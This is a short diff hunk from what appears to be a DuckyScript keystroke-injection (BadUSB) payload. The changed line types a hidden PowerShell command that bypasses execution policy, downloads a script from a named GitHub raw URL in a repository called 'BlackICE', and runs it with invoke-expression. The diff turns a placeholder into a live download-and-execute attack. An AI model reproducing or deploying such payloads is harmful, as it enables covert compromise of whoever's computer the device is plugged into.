@@ -20,7 +20,7 @@ ENTER
 DELAY 1000
 GUI r
 DELAY 300
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr #SCRIPTURL/horsd.ps1?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/mrcable/BlackICE/main/horsed.ps1?dl=1; invoke-expression $pl
 ENTER
 DELAY 1000
 GUI r
